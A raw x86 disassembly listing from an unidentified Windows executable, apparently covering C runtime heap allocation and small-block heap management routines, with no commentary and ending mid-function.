  4249f2:	cmp    DWORD PTR ds:0x465d04,0x1
  4249f9:	je     0x424a1f
  4249fb:	push   0x4285f4
  424a00:	call   DWORD PTR ds:0x428044
  424a06:	test   eax,eax
  424a08:	je     0x424a1f
  424a0a:	push   0x4285cc
  424a0f:	push   eax
  424a10:	call   DWORD PTR ds:0x428040
  424a16:	mov    ds:0x465fc8,eax
  424a1b:	test   eax,eax
  424a1d:	jne    0x424a29
  424a1f:	mov    eax,0x4249cd
  424a24:	mov    ds:0x465fc8,eax
  424a29:	and    DWORD PTR [ebp-0x4],0x0
  424a2d:	push   DWORD PTR [ebp+0xc]
  424a30:	push   DWORD PTR [ebp+0x8]
  424a33:	call   eax
  424a35:	mov    DWORD PTR [ebp-0x1c],eax
  424a38:	jmp    0x424a5e
  424a3a:	mov    eax,DWORD PTR [ebp-0x14]
  424a3d:	mov    eax,DWORD PTR [eax]
  424a3f:	mov    eax,DWORD PTR [eax]
  424a41:	mov    DWORD PTR [ebp-0x20],eax
  424a44:	xor    eax,eax
  424a46:	inc    eax
  424a47:	ret    
  424a48:	mov    esp,DWORD PTR [ebp-0x18]
  424a4b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424a52:	jne    0x424a5c
  424a54:	push   0x8
  424a56:	call   DWORD PTR ds:0x4280a8
  424a5c:	xor    eax,eax
  424a5e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a62:	call   0x42398b
  424a67:	ret    
  424a68:	push   0x10
  424a6a:	push   0x428618
  424a6f:	call   0x423950
  424a74:	mov    esi,DWORD PTR [ebp+0x8]
  424a77:	imul   esi,DWORD PTR [ebp+0xc]
  424a7b:	mov    DWORD PTR [ebp-0x1c],esi
  424a7e:	test   esi,esi
  424a80:	jne    0x424a83
  424a82:	inc    esi
  424a83:	xor    edi,edi
  424a85:	mov    DWORD PTR [ebp-0x20],edi
  424a88:	cmp    esi,0xffffffe0
  424a8b:	ja     0x424af2
  424a8d:	cmp    DWORD PTR ds:0x466384,0x3
  424a94:	jne    0x424add
  424a96:	add    esi,0xf
  424a99:	and    esi,0xfffffff0
  424a9c:	mov    DWORD PTR [ebp+0xc],esi
  424a9f:	mov    ebx,DWORD PTR [ebp-0x1c]
  424aa2:	cmp    ebx,DWORD PTR ds:0x466144
  424aa8:	ja     0x424add
  424aaa:	push   0x4
  424aac:	call   0x423b0f
  424ab1:	pop    ecx
  424ab2:	and    DWORD PTR [ebp-0x4],edi
  424ab5:	push   ebx
  424ab6:	call   0x425511
  424abb:	pop    ecx
  424abc:	mov    DWORD PTR [ebp-0x20],eax
  424abf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424ac3:	call   0x424b12
  424ac8:	mov    edi,DWORD PTR [ebp-0x20]
  424acb:	test   edi,edi
  424acd:	je     0x424ae1
  424acf:	push   DWORD PTR [ebp-0x1c]
  424ad2:	push   0x0
  424ad4:	push   edi
  424ad5:	call   0x426250
  424ada:	add    esp,0xc
  424add:	test   edi,edi
  424adf:	jne    0x424b1b
  424ae1:	push   esi
  424ae2:	push   0x8
  424ae4:	push   DWORD PTR ds:0x466380
  424aea:	call   DWORD PTR ds:0x428030
  424af0:	mov    edi,eax
  424af2:	test   edi,edi
  424af4:	jne    0x424b1b
  424af6:	cmp    DWORD PTR ds:0x466008,edi
  424afc:	je     0x424b1b
  424afe:	push   esi
  424aff:	call   0x426232
  424b04:	pop    ecx
  424b05:	test   eax,eax
  424b07:	jne    0x424a83
  424b0d:	jmp    0x424b1d
  424b0f:	mov    esi,DWORD PTR [ebp+0xc]
  424b12:	push   0x4
  424b14:	call   0x423a7b
  424b19:	pop    ecx
  424b1a:	ret    
  424b1b:	mov    eax,edi
  424b1d:	call   0x42398b
  424b22:	ret    
  424b23:	push   esi
  424b24:	mov    esi,DWORD PTR [esp+0x8]
  424b28:	mov    eax,DWORD PTR [esi+0x3c]
  424b2b:	push   edi
  424b2c:	xor    edi,edi
  424b2e:	cmp    eax,DWORD PTR ds:0x466014
  424b34:	je     0x424b99
  424b36:	cmp    eax,edi
  424b38:	je     0x424b99
  424b3a:	mov    eax,DWORD PTR [esi+0x2c]
  424b3d:	cmp    DWORD PTR [eax],edi
  424b3f:	jne    0x424b99
  424b41:	mov    eax,DWORD PTR [esi+0x34]
  424b44:	cmp    eax,edi
  424b46:	je     0x424b64
  424b48:	cmp    DWORD PTR [eax],edi
  424b4a:	jne    0x424b64
  424b4c:	cmp    eax,DWORD PTR ds:0x466130
  424b52:	je     0x424b64
  424b54:	push   eax
  424b55:	call   0x42455a
  424b5a:	push   DWORD PTR [esi+0x3c]
  424b5d:	call   0x42649f
  424b62:	pop    ecx
  424b63:	pop    ecx
  424b64:	mov    eax,DWORD PTR [esi+0x30]
  424b67:	cmp    eax,edi
  424b69:	je     0x424b87
  424b6b:	cmp    DWORD PTR [eax],edi
  424b6d:	jne    0x424b87
  424b6f:	cmp    eax,DWORD PTR ds:0x466134
  424b75:	je     0x424b87
  424b77:	push   eax
  424b78:	call   0x42455a
  424b7d:	push   DWORD PTR [esi+0x3c]
  424b80:	call   0x426440
  424b85:	pop    ecx
  424b86:	pop    ecx
  424b87:	push   DWORD PTR [esi+0x2c]
  424b8a:	call   0x42455a
  424b8f:	push   DWORD PTR [esi+0x3c]
  424b92:	call   0x42455a
  424b97:	pop    ecx
  424b98:	pop    ecx
  424b99:	mov    eax,DWORD PTR [esi+0x40]
  424b9c:	cmp    eax,DWORD PTR ds:0x46612c
  424ba2:	je     0x424bbc
  424ba4:	cmp    eax,edi
  424ba6:	je     0x424bbc
  424ba8:	cmp    DWORD PTR [eax],edi
  424baa:	jne    0x424bbc
  424bac:	push   eax
  424bad:	call   0x42455a
  424bb2:	push   DWORD PTR [esi+0x44]
  424bb5:	call   0x42455a
  424bba:	pop    ecx
  424bbb:	pop    ecx
  424bbc:	mov    eax,DWORD PTR [esi+0x50]
  424bbf:	cmp    eax,DWORD PTR ds:0x466010
  424bc5:	je     0x424be3
  424bc7:	cmp    eax,edi
  424bc9:	je     0x424be3
  424bcb:	cmp    DWORD PTR [eax+0xb4],edi
  424bd1:	jne    0x424be3
  424bd3:	push   eax
  424bd4:	call   0x4262b0
  424bd9:	push   DWORD PTR [esi+0x50]
  424bdc:	call   0x42455a
  424be1:	pop    ecx
  424be2:	pop    ecx
  424be3:	push   esi
  424be4:	call   0x42455a
  424be9:	pop    ecx
  424bea:	pop    edi
  424beb:	pop    esi
  424bec:	ret    
  424bed:	push   esi
  424bee:	call   0x423803
  424bf3:	mov    esi,eax
  424bf5:	mov    eax,DWORD PTR [esi+0x64]
  424bf8:	cmp    eax,DWORD PTR ds:0x4657bc
  424bfe:	je     0x424caa
  424c04:	test   eax,eax
  424c06:	je     0x424c37
  424c08:	mov    ecx,DWORD PTR [eax+0x2c]
  424c0b:	dec    DWORD PTR [eax]
  424c0d:	test   ecx,ecx
  424c0f:	je     0x424c13
  424c11:	dec    DWORD PTR [ecx]
  424c13:	mov    ecx,DWORD PTR [eax+0x34]
  424c16:	test   ecx,ecx
  424c18:	je     0x424c1c
  424c1a:	dec    DWORD PTR [ecx]
  424c1c:	mov    ecx,DWORD PTR [eax+0x30]
  424c1f:	test   ecx,ecx
  424c21:	je     0x424c25
  424c23:	dec    DWORD PTR [ecx]
  424c25:	mov    ecx,DWORD PTR [eax+0x40]
  424c28:	test   ecx,ecx
  424c2a:	je     0x424c2e
  424c2c:	dec    DWORD PTR [ecx]
  424c2e:	mov    ecx,DWORD PTR [eax+0x4c]
  424c31:	dec    DWORD PTR [ecx+0xb4]
  424c37:	mov    ecx,DWORD PTR ds:0x4657bc
  424c3d:	mov    DWORD PTR [esi+0x64],ecx
  424c40:	mov    ecx,DWORD PTR ds:0x4657bc
  424c46:	inc    DWORD PTR [ecx]
  424c48:	mov    ecx,DWORD PTR ds:0x4657bc
  424c4e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424c51:	test   ecx,ecx
  424c53:	je     0x424c57
  424c55:	inc    DWORD PTR [ecx]
  424c57:	mov    ecx,DWORD PTR ds:0x4657bc
  424c5d:	mov    ecx,DWORD PTR [ecx+0x34]
  424c60:	test   ecx,ecx
  424c62:	je     0x424c66
  424c64:	inc    DWORD PTR [ecx]
  424c66:	mov    ecx,DWORD PTR ds:0x4657bc
  424c6c:	mov    ecx,DWORD PTR [ecx+0x30]
  424c6f:	test   ecx,ecx
  424c71:	je     0x424c75
  424c73:	inc    DWORD PTR [ecx]
  424c75:	mov    ecx,DWORD PTR ds:0x4657bc
  424c7b:	mov    ecx,DWORD PTR [ecx+0x40]
  424c7e:	test   ecx,ecx
  424c80:	je     0x424c84
  424c82:	inc    DWORD PTR [ecx]
  424c84:	mov    ecx,DWORD PTR ds:0x4657bc
  424c8a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424c8d:	inc    DWORD PTR [ecx+0xb4]
  424c93:	test   eax,eax
  424c95:	je     0x424caa
  424c97:	cmp    DWORD PTR [eax],0x0
  424c9a:	jne    0x424caa
  424c9c:	cmp    eax,0x465768
  424ca1:	je     0x424caa
  424ca3:	push   eax
  424ca4:	call   0x424b23
  424ca9:	pop    ecx
  424caa:	mov    eax,DWORD PTR [esi+0x64]
  424cad:	pop    esi
  424cae:	ret    
  424caf:	push   0xc
  424cb1:	push   0x4287a8
  424cb6:	call   0x423950
  424cbb:	push   0xc
  424cbd:	call   0x423b0f
  424cc2:	pop    ecx
  424cc3:	and    DWORD PTR [ebp-0x4],0x0
  424cc7:	call   0x424bed
  424ccc:	mov    DWORD PTR [ebp-0x1c],eax
  424ccf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424cd3:	call   0x424ce1
  424cd8:	mov    eax,DWORD PTR [ebp-0x1c]
  424cdb:	call   0x42398b
  424ce0:	ret    
  424ce1:	push   0xc
  424ce3:	call   0x423a7b
  424ce8:	pop    ecx
  424ce9:	ret    
  424cea:	push   0x140
  424cef:	push   0x0
  424cf1:	push   DWORD PTR ds:0x466380
  424cf7:	call   DWORD PTR ds:0x428030
  424cfd:	test   eax,eax
  424cff:	mov    ds:0x466140,eax
  424d04:	jne    0x424d07
  424d06:	ret    
  424d07:	mov    ecx,DWORD PTR [esp+0x4]
  424d0b:	and    DWORD PTR ds:0x466138,0x0
  424d12:	and    DWORD PTR ds:0x46613c,0x0
  424d19:	mov    ds:0x466148,eax
  424d1e:	xor    eax,eax
  424d20:	mov    DWORD PTR ds:0x466144,ecx
  424d26:	mov    DWORD PTR ds:0x46614c,0x10
  424d30:	inc    eax
  424d31:	ret    
  424d32:	mov    eax,ds:0x46613c
  424d37:	lea    ecx,[eax+eax*4]
  424d3a:	mov    eax,ds:0x466140
  424d3f:	lea    ecx,[eax+ecx*4]
  424d42:	jmp    0x424d56
  424d44:	mov    edx,DWORD PTR [esp+0x4]
  424d48:	sub    edx,DWORD PTR [eax+0xc]
  424d4b:	cmp    edx,0x100000
  424d51:	jb     0x424d5c
  424d53:	add    eax,0x14
  424d56:	cmp    eax,ecx
  424d58:	jb     0x424d44
  424d5a:	xor    eax,eax
  424d5c:	ret    
  424d5d:	push   ebp
  424d5e:	mov    ebp,esp
  424d60:	sub    esp,0x10
  424d63:	mov    ecx,DWORD PTR [ebp+0x8]
  424d66:	mov    eax,DWORD PTR [ecx+0x10]
  424d69:	push   esi
  424d6a:	mov    esi,DWORD PTR [ebp+0xc]
  424d6d:	push   edi
  424d6e:	mov    edi,esi
  424d70:	sub    edi,DWORD PTR [ecx+0xc]
  424d73:	add    esi,0xfffffffc
  424d76:	shr    edi,0xf
  424d79:	mov    ecx,edi
  424d7b:	imul   ecx,ecx,0x204
  424d81:	lea    ecx,[ecx+eax*1+0x144]
  424d88:	mov    DWORD PTR [ebp-0x10],ecx
  424d8b:	mov    ecx,DWORD PTR [esi]
  424d8d:	dec    ecx
  424d8e:	test   cl,0x1
  424d91:	mov    DWORD PTR [ebp-0x4],ecx
  424d94:	jne    0x425071
  424d9a:	push   ebx
  424d9b:	lea    ebx,[ecx+esi*1]
  424d9e:	mov    edx,DWORD PTR [ebx]
  424da0:	mov    DWORD PTR [ebp-0xc],edx
  424da3:	mov    edx,DWORD PTR [esi-0x4]
  424da6:	mov    DWORD PTR [ebp-0x8],edx
  424da9:	mov    edx,DWORD PTR [ebp-0xc]
  424dac:	test   dl,0x1
  424daf:	mov    DWORD PTR [ebp+0xc],ebx
  424db2:	jne    0x424e28
  424db4:	sar    edx,0x4
  424db7:	dec    edx
  424db8:	cmp    edx,0x3f
  424dbb:	jbe    0x424dc0
  424dbd:	push   0x3f
  424dbf:	pop    edx
  424dc0:	mov    ecx,DWORD PTR [ebx+0x4]
  424dc3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424dc6:	jne    0x424e0a
  424dc8:	cmp    edx,0x20
  424dcb:	mov    ebx,0x80000000
  424dd0:	jae    0x424deb
  424dd2:	mov    ecx,edx
  424dd4:	shr    ebx,cl
  424dd6:	lea    ecx,[edx+eax*1+0x4]
  424dda:	not    ebx
  424ddc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424de0:	dec    BYTE PTR [ecx]
  424de2:	jne    0x424e07
  424de4:	mov    ecx,DWORD PTR [ebp+0x8]
  424de7:	and    DWORD PTR [ecx],ebx
  424de9:	jmp    0x424e07
  424deb:	lea    ecx,[edx-0x20]
  424dee:	shr    ebx,cl
  424df0:	lea    ecx,[edx+eax*1+0x4]
  424df4:	not    ebx
  424df6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424dfd:	dec    BYTE PTR [ecx]
  424dff:	jne    0x424e07
  424e01:	mov    ecx,DWORD PTR [ebp+0x8]
  424e04:	and    DWORD PTR [ecx+0x4],ebx
  424e07:	mov    ebx,DWORD PTR [ebp+0xc]
  424e0a:	mov    edx,DWORD PTR [ebx+0x8]
  424e0d:	mov    ebx,DWORD PTR [ebx+0x4]
  424e10:	mov    ecx,DWORD PTR [ebp-0x4]
  424e13:	add    ecx,DWORD PTR [ebp-0xc]
  424e16:	mov    DWORD PTR [edx+0x4],ebx
  424e19:	mov    edx,DWORD PTR [ebp+0xc]
  424e1c:	mov    ebx,DWORD PTR [edx+0x4]
  424e1f:	mov    edx,DWORD PTR [edx+0x8]
  424e22:	mov    DWORD PTR [ebx+0x8],edx
  424e25:	mov    DWORD PTR [ebp-0x4],ecx
  424e28:	mov    edx,ecx
  424e2a:	sar    edx,0x4
  424e2d:	dec    edx
  424e2e:	cmp    edx,0x3f
  424e31:	jbe    0x424e36
  424e33:	push   0x3f
  424e35:	pop    edx
  424e36:	mov    ebx,DWORD PTR [ebp-0x8]
  424e39:	and    ebx,0x1
  424e3c:	mov    DWORD PTR [ebp-0xc],ebx
  424e3f:	jne    0x424ed4
  424e45:	sub    esi,DWORD PTR [ebp-0x8]
  424e48:	mov    ebx,DWORD PTR [ebp-0x8]
  424e4b:	sar    ebx,0x4
  424e4e:	push   0x3f
  424e50:	mov    DWORD PTR [ebp+0xc],esi
  424e53:	dec    ebx
  424e54:	pop    esi
  424e55:	cmp    ebx,esi
  424e57:	jbe    0x424e5b
  424e59:	mov    ebx,esi
  424e5b:	add    ecx,DWORD PTR [ebp-0x8]
  424e5e:	mov    edx,ecx
  424e60:	sar    edx,0x4
  424e63:	dec    edx
  424e64:	cmp    edx,esi
  424e66:	mov    DWORD PTR [ebp-0x4],ecx
  424e69:	jbe    0x424e6d
  424e6b:	mov    edx,esi
  424e6d:	cmp    ebx,edx
  424e6f:	je     0x424ecf
  424e71:	mov    ecx,DWORD PTR [ebp+0xc]
  424e74:	mov    esi,DWORD PTR [ecx+0x4]
  424e77:	cmp    esi,DWORD PTR [ecx+0x8]
  424e7a:	jne    0x424eb7
  424e7c:	cmp    ebx,0x20
  424e7f:	mov    esi,0x80000000
  424e84:	jae    0x424e9d
  424e86:	mov    ecx,ebx
  424e88:	shr    esi,cl
  424e8a:	not    esi
  424e8c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424e90:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e94:	jne    0x424eb7
  424e96:	mov    ecx,DWORD PTR [ebp+0x8]
  424e99:	and    DWORD PTR [ecx],esi
  424e9b:	jmp    0x424eb7
  424e9d:	lea    ecx,[ebx-0x20]
  424ea0:	shr    esi,cl
  424ea2:	not    esi
  424ea4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424eab:	dec    BYTE PTR [ebx+eax*1+0x4]
  424eaf:	jne    0x424eb7
  424eb1:	mov    ecx,DWORD PTR [ebp+0x8]
  424eb4:	and    DWORD PTR [ecx+0x4],esi
  424eb7:	mov    ecx,DWORD PTR [ebp+0xc]
  424eba:	mov    esi,DWORD PTR [ecx+0x8]
  424ebd:	mov    ecx,DWORD PTR [ecx+0x4]
  424ec0:	mov    DWORD PTR [esi+0x4],ecx
  424ec3:	mov    ecx,DWORD PTR [ebp+0xc]
  424ec6:	mov    esi,DWORD PTR [ecx+0x4]
  424ec9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ecc:	mov    DWORD PTR [esi+0x8],ecx
  424ecf:	mov    esi,DWORD PTR [ebp+0xc]
  424ed2:	jmp    0x424ed7
  424ed4:	mov    ebx,DWORD PTR [ebp+0x8]
  424ed7:	cmp    DWORD PTR [ebp-0xc],0x0
  424edb:	jne    0x424ee5
  424edd:	cmp    ebx,edx
  424edf:	je     0x424f65
  424ee5:	mov    ecx,DWORD PTR [ebp-0x10]
  424ee8:	lea    ecx,[ecx+edx*8]
  424eeb:	mov    ebx,DWORD PTR [ecx+0x4]
  424eee:	mov    DWORD PTR [esi+0x8],ecx
  424ef1:	mov    DWORD PTR [esi+0x4],ebx
  424ef4:	mov    DWORD PTR [ecx+0x4],esi
  424ef7:	mov    ecx,DWORD PTR [esi+0x4]
  424efa:	mov    DWORD PTR [ecx+0x8],esi
  424efd:	mov    ecx,DWORD PTR [esi+0x4]
  424f00:	cmp    ecx,DWORD PTR [esi+0x8]
  424f03:	jne    0x424f65
  424f05:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424f09:	mov    BYTE PTR [ebp+0xf],cl
  424f0c:	inc    cl
  424f0e:	cmp    edx,0x20
  424f11:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424f15:	jae    0x424f3c
  424f17:	cmp    BYTE PTR [ebp+0xf],0x0
  424f1b:	jne    0x424f2b
  424f1d:	mov    ecx,edx
  424f1f:	mov    ebx,0x80000000
  424f24:	shr    ebx,cl
  424f26:	mov    ecx,DWORD PTR [ebp+0x8]
  424f29:	or     DWORD PTR [ecx],ebx
  424f2b:	mov    ebx,0x80000000
  424f30:	mov    ecx,edx
  424f32:	shr    ebx,cl
  424f34:	lea    eax,[eax+edi*4+0x44]
  424f38:	or     DWORD PTR [eax],ebx
  424f3a:	jmp    0x424f65
  424f3c:	cmp    BYTE PTR [ebp+0xf],0x0
  424f40:	jne    0x424f52
  424f42:	lea    ecx,[edx-0x20]
  424f45:	mov    ebx,0x80000000
  424f4a:	shr    ebx,cl
  424f4c:	mov    ecx,DWORD PTR [ebp+0x8]
  424f4f:	or     DWORD PTR [ecx+0x4],ebx
  424f52:	lea    ecx,[edx-0x20]
  424f55:	mov    edx,0x80000000
  424f5a:	shr    edx,cl
  424f5c:	lea    eax,[eax+edi*4+0xc4]
  424f63:	or     DWORD PTR [eax],edx
  424f65:	mov    eax,DWORD PTR [ebp-0x4]
  424f68:	mov    DWORD PTR [esi],eax
  424f6a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424f6e:	mov    eax,DWORD PTR [ebp-0x10]
  424f71:	dec    DWORD PTR [eax]
  424f73:	jne    0x425070
  424f79:	mov    eax,ds:0x466138
  424f7e:	test   eax,eax
  424f80:	je     0x425062
  424f86:	mov    ecx,DWORD PTR ds:0x466150
  424f8c:	mov    esi,DWORD PTR ds:0x4280c0
  424f92:	push   0x4000
  424f97:	shl    ecx,0xf
  424f9a:	add    ecx,DWORD PTR [eax+0xc]
  424f9d:	mov    ebx,0x8000
  424fa2:	push   ebx
  424fa3:	push   ecx
  424fa4:	call   esi
  424fa6:	mov    ecx,DWORD PTR ds:0x466150
  424fac:	mov    eax,ds:0x466138
  424fb1:	mov    edx,0x80000000
  424fb6:	shr    edx,cl
  424fb8:	or     DWORD PTR [eax+0x8],edx
  424fbb:	mov    eax,ds:0x466138
  424fc0:	mov    eax,DWORD PTR [eax+0x10]
  424fc3:	mov    ecx,DWORD PTR ds:0x466150
  424fc9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424fd1:	mov    eax,ds:0x466138
  424fd6:	mov    eax,DWORD PTR [eax+0x10]
  424fd9:	dec    BYTE PTR [eax+0x43]
  424fdc:	mov    eax,ds:0x466138
  424fe1:	mov    ecx,DWORD PTR [eax+0x10]
  424fe4:	cmp    BYTE PTR [ecx+0x43],0x0
  424fe8:	jne    0x424ff3
  424fea:	and    DWORD PTR [eax+0x4],0xfffffffe
  424fee:	mov    eax,ds:0x466138
  424ff3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424ff7:	jne    0x425062
  424ff9:	push   ebx
  424ffa:	push   0x0
  424ffc:	push   DWORD PTR [eax+0xc]
  424fff:	call   esi
  425001:	mov    eax,ds:0x466138
  425006:	push   DWORD PTR [eax+0x10]
  425009:	push   0x0
  42500b:	push   DWORD PTR ds:0x466380
  425011:	call   DWORD PTR ds:0x4280c4
  425017:	mov    eax,ds:0x46613c
  42501c:	mov    edx,DWORD PTR ds:0x466140
  425022:	lea    eax,[eax+eax*4]
  425025:	shl    eax,0x2
  425028:	mov    ecx,eax
  42502a:	mov    eax,ds:0x466138
  42502f:	sub    ecx,eax
  425031:	lea    ecx,[ecx+edx*1-0x14]
  425035:	push   ecx
  425036:	lea    ecx,[eax+0x14]
  425039:	push   ecx
  42503a:	push   eax
  42503b:	call   0x426890
  425040:	mov    eax,DWORD PTR [ebp+0x8]
  425043:	add    esp,0xc
  425046:	dec    DWORD PTR ds:0x46613c
  42504c:	cmp    eax,DWORD PTR ds:0x466138
  425052:	jbe    0x425058
  425054:	sub    DWORD PTR [ebp+0x8],0x14
  425058:	mov    eax,ds:0x466140
  42505d:	mov    ds:0x466148,eax
  425062:	mov    eax,DWORD PTR [ebp+0x8]
  425065:	mov    ds:0x466138,eax
  42506a:	mov    DWORD PTR ds:0x466150,edi
  425070:	pop    ebx
  425071:	pop    edi
  425072:	pop    esi
  425073:	leave  
  425074:	ret    
  425075:	mov    eax,ds:0x46613c
  42507a:	mov    ecx,DWORD PTR ds:0x46614c
  425080:	push   edi
  425081:	xor    edi,edi
  425083:	cmp    eax,ecx
  425085:	jne    0x4250bb
  425087:	lea    eax,[ecx+ecx*4+0x50]
  42508b:	shl    eax,0x2
  42508e:	push   eax
  42508f:	push   DWORD PTR ds:0x466140
  425095:	push   edi
  425096:	push   DWORD PTR ds:0x466380
  42509c:	call   DWORD PTR ds:0x4280e8
  4250a2:	cmp    eax,edi
  4250a4:	jne    0x4250aa
  4250a6:	xor    eax,eax
  4250a8:	pop    edi
  4250a9:	ret    
  4250aa:	add    DWORD PTR ds:0x46614c,0x10
  4250b1:	mov    ds:0x466140,eax
  4250b6:	mov    eax,ds:0x46613c
  4250bb:	mov    ecx,DWORD PTR ds:0x466140
  4250c1:	push   esi
  4250c2:	push   0x41c4
  4250c7:	push   0x8
  4250c9:	push   DWORD PTR ds:0x466380
  4250cf:	lea    eax,[eax+eax*4]
  4250d2:	lea    esi,[ecx+eax*4]
  4250d5:	call   DWORD PTR ds:0x428030
  4250db:	cmp    eax,edi
  4250dd:	mov    DWORD PTR [esi+0x10],eax
  4250e0:	jne    0x4250e6
  4250e2:	xor    eax,eax
  4250e4:	jmp    0x425129
  4250e6:	push   0x4
  4250e8:	push   0x2000
  4250ed:	push   0x100000
  4250f2:	push   edi
  4250f3:	call   DWORD PTR ds:0x4280e4
  4250f9:	cmp    eax,edi
  4250fb:	mov    DWORD PTR [esi+0xc],eax
  4250fe:	jne    0x425112
  425100:	push   DWORD PTR [esi+0x10]
  425103:	push   edi
  425104:	push   DWORD PTR ds:0x466380
  42510a:	call   DWORD PTR ds:0x4280c4
  425110:	jmp    0x4250e2
  425112:	or     DWORD PTR [esi+0x8],0xffffffff
  425116:	mov    DWORD PTR [esi],edi
  425118:	mov    DWORD PTR [esi+0x4],edi
  42511b:	inc    DWORD PTR ds:0x46613c
  425121:	mov    eax,DWORD PTR [esi+0x10]
  425124:	or     DWORD PTR [eax],0xffffffff
  425127:	mov    eax,esi
  425129:	pop    esi
  42512a:	pop    edi
  42512b:	ret    
  42512c:	push   ebp
  42512d:	mov    ebp,esp
  42512f:	push   ecx
  425130:	push   ecx
  425131:	mov    ecx,DWORD PTR [ebp+0x8]
  425134:	mov    eax,DWORD PTR [ecx+0x8]
  425137:	push   ebx
  425138:	push   esi
  425139:	mov    esi,DWORD PTR [ecx+0x10]
  42513c:	push   edi
  42513d:	xor    ebx,ebx
  42513f:	jmp    0x425144
  425141:	shl    eax,1
  425143:	inc    ebx
  425144:	test   eax,eax
  425146:	jge    0x425141
  425148:	mov    eax,ebx
  42514a:	imul   eax,eax,0x204
  425150:	lea    eax,[eax+esi*1+0x144]
  425157:	push   0x3f
  425159:	mov    DWORD PTR [ebp-0x8],eax
  42515c:	pop    edx
  42515d:	mov    DWORD PTR [eax+0x8],eax
  425160:	mov    DWORD PTR [eax+0x4],eax
  425163:	add    eax,0x8
  425166:	dec    edx
  425167:	jne    0x42515d
  425169:	push   0x4
  42516b:	mov    edi,ebx
  42516d:	push   0x1000
  425172:	shl    edi,0xf
  425175:	add    edi,DWORD PTR [ecx+0xc]
  425178:	push   0x8000
  42517d:	push   edi
  42517e:	call   DWORD PTR ds:0x4280e4
  425184:	test   eax,eax
  425186:	jne    0x425190
  425188:	or     eax,0xffffffff
  42518b:	jmp    0x42522d
  425190:	lea    edx,[edi+0x7000]
  425196:	cmp    edi,edx
  425198:	mov    DWORD PTR [ebp-0x4],edx
  42519b:	ja     0x4251e0
  42519d:	mov    ecx,edx
  42519f:	sub    ecx,edi
  4251a1:	shr    ecx,0xc
  4251a4:	lea    eax,[edi+0x10]
  4251a7:	inc    ecx
  4251a8:	or     DWORD PTR [eax-0x8],0xffffffff
  4251ac:	or     DWORD PTR [eax+0xfec],0xffffffff
  4251b3:	lea    edx,[eax+0xffc]
  4251b9:	mov    DWORD PTR [eax],edx
  4251bb:	lea    edx,[eax-0x1004]
  4251c1:	mov    DWORD PTR [eax-0x4],0xff0
  4251c8:	mov    DWORD PTR [eax+0x4],edx
  4251cb:	mov    DWORD PTR [eax+0xfe8],0xff0
  4251d5:	add    eax,0x1000
  4251da:	dec    ecx
  4251db:	jne    0x4251a8
  4251dd:	mov    edx,DWORD PTR [ebp-0x4]
  4251e0:	mov    eax,DWORD PTR [ebp-0x8]
  4251e3:	add    eax,0x1f8
  4251e8:	lea    ecx,[edi+0xc]
  4251eb:	mov    DWORD PTR [eax+0x4],ecx
  4251ee:	mov    DWORD PTR [ecx+0x8],eax
  4251f1:	lea    ecx,[edx+0xc]
  4251f4:	mov    DWORD PTR [eax+0x8],ecx
  4251f7:	mov    DWORD PTR [ecx+0x4],eax
  4251fa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  4251ff:	xor    edi,edi
  425201:	inc    edi
  425202:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425209:	mov    al,BYTE PTR [esi+0x43]
  42520c:	mov    cl,al
  42520e:	inc    cl
  425210:	test   al,al
  425212:	mov    eax,DWORD PTR [ebp+0x8]
  425215:	mov    BYTE PTR [esi+0x43],cl
  425218:	jne    0x42521d
  42521a:	or     DWORD PTR [eax+0x4],edi
  42521d:	mov    edx,0x80000000
  425222:	mov    ecx,ebx
  425224:	shr    edx,cl
  425226:	not    edx
  425228:	and    DWORD PTR [eax+0x8],edx
  42522b:	mov    eax,ebx
  42522d:	pop    edi
  42522e:	pop    esi
  42522f:	pop    ebx
  425230:	leave  
  425231:	ret    
  425232:	push   ebp
  425233:	mov    ebp,esp
  425235:	sub    esp,0xc
  425238:	mov    ecx,DWORD PTR [ebp+0x8]
  42523b:	mov    eax,DWORD PTR [ecx+0x10]
  42523e:	push   ebx
  42523f:	push   esi
  425240:	mov    esi,DWORD PTR [ebp+0x10]
  425243:	push   edi
  425244:	mov    edi,DWORD PTR [ebp+0xc]
  425247:	mov    edx,edi
  425249:	sub    edx,DWORD PTR [ecx+0xc]
  42524c:	add    esi,0x17
  42524f:	shr    edx,0xf
  425252:	mov    ecx,edx
  425254:	imul   ecx,ecx,0x204
  42525a:	lea    ecx,[ecx+eax*1+0x144]
  425261:	mov    DWORD PTR [ebp-0xc],ecx
  425264:	mov    ecx,DWORD PTR [edi-0x4]
  425267:	and    esi,0xfffffff0
  42526a:	dec    ecx
  42526b:	cmp    esi,ecx
  42526d:	lea    edi,[ecx+edi*1-0x4]
  425271:	mov    ebx,DWORD PTR [edi]
  425273:	mov    DWORD PTR [ebp+0x10],ecx
  425276:	mov    DWORD PTR [ebp-0x4],ebx
  425279:	jle    0x4253d4
  42527f:	test   bl,0x1
  425282:	jne    0x4253cd
  425288:	add    ebx,ecx
  42528a:	cmp    esi,ebx
  42528c:	jg     0x4253cd
  425292:	mov    ecx,DWORD PTR [ebp-0x4]
  425295:	sar    ecx,0x4
  425298:	dec    ecx
  425299:	cmp    ecx,0x3f
  42529c:	mov    DWORD PTR [ebp-0x8],ecx
  42529f:	jbe    0x4252a7
  4252a1:	push   0x3f
  4252a3:	pop    ecx
  4252a4:	mov    DWORD PTR [ebp-0x8],ecx
  4252a7:	mov    ebx,DWORD PTR [edi+0x4]
  4252aa:	cmp    ebx,DWORD PTR [edi+0x8]
  4252ad:	jne    0x4252f2
  4252af:	cmp    ecx,0x20
